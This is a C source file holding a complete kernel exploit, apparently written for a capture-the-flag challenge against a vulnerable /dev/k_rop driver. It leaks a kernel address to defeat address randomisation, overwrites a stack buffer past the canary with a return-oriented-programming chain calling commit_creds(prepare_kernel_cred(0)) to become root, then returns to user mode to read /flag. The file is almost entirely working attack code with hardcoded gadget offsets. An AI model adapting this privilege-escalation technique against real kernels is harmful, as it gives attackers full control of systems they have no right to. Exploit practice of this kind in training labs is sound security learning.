#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

#define SIZE 0x200
#define KERNEL_BASE 0xFFFFFFFF81000000
#define LEAK_OFFSET 0x201532
#define OFF_POP_RDI_RET (0xffffffff810031c4 - KERNEL_BASE)
#define OFF_PREPARE_KERNEL_CRED (0xFFFFFFFF81094670 - KERNEL_BASE)
#define OFF_COMMIT_CREDS (0xFFFFFFFF810943D0 - KERNEL_BASE)
#define OFF_MOV_RCX_RAX (0xffffffff814489f4 - KERNEL_BASE)
#define OFF_MOV_RDI_RCX (0xffffffff810e8134 - KERNEL_BASE) //rdx must be 0, it also increase by 8 rsp
#define OFF_POP_RDX_RET (0xffffffff81051398 - KERNEL_BASE)
#define OFF_SWAPGS_RET (0xffffffff81c14530 - KERNEL_BASE)
#define OFF_IRETQ (0xffffffff8102c61b - KERNEL_BASE)

unsigned long long user_cs, rflags, user_rsp, user_ss;


__attribute__((always_inline)) void get_regs(){
    asm volatile(
        ".intel_syntax noprefix;\n"
        "mov %0, cs;\n"
        "mov %1, rsp;\n"
        "mov %2, ss;\n"
        "pushf;\n"
        "pop %3;\n"
        : "=r"(user_cs), "=r"(user_rsp), "=r"(user_ss), "=r"(rflags)
        :
        :
    );
}

void win(){
    printf("You win!\n");
    char buf[0x100] = {0};
    int fd = open("/flag", O_RDONLY);
    read(fd, buf, 0x100);
    write(1, buf, 0x100);
}

int main(int argc, char *argv[]){
    char buf[SIZE];
    int fd, i;
    unsigned long long *ptr;
    ptr = (unsigned long long *)buf;

    fd = open("/dev/k_rop", O_RDWR);
    if(fd < 0){
        printf("open failed\n");
        return 1;
    }
    read(fd, buf, SIZE);
    for(i = 0; i < SIZE / 8; i++){
        printf("%03d) 0x%llx\n", i, ptr[i]);
    }

    // Kernel ROP chain in buf, we can change the content of the buf after the canary since
    // it is already there

    get_regs();
    unsigned long long kernel_base = ptr[33] - LEAK_OFFSET;
    printf("Kernel base: 0x%llx\n", kernel_base);

    //only when uploading the exploit since we cannot use arguments
    //if(1){
    if (argc == 2){
        // Plan: commit_creds(prepare_kernel_cred(0))
        ptr[33] = kernel_base + OFF_POP_RDI_RET;
        ptr[34] = 0;
        ptr[35] = kernel_base + OFF_PREPARE_KERNEL_CRED; //result in rax
        ptr[36] = kernel_base + OFF_MOV_RCX_RAX;
        ptr[37] = kernel_base + OFF_POP_RDX_RET;
        ptr[38] = 0;
        ptr[39] = kernel_base + OFF_MOV_RDI_RCX;
        ptr[40] = 0xdeadbeef; //due the add rsp, 0x8
        ptr[41] = kernel_base + OFF_COMMIT_CREDS;
        // at this point, we should have root process, we need to return to userland
        ptr[42] = kernel_base + OFF_SWAPGS_RET;
        ptr[43] = kernel_base + OFF_IRETQ;
        ptr[44] = (unsigned long long)win;
        ptr[45] = user_cs;
        ptr[46] = rflags;
        ptr[47] = user_rsp;
        ptr[48] = user_ss;
        
        // SWAPGS
        // IRETQ
        // RIP 
        // CS
        // RFLAGS
        // RSP
        // SS


        write(fd, buf, SIZE);
    }
}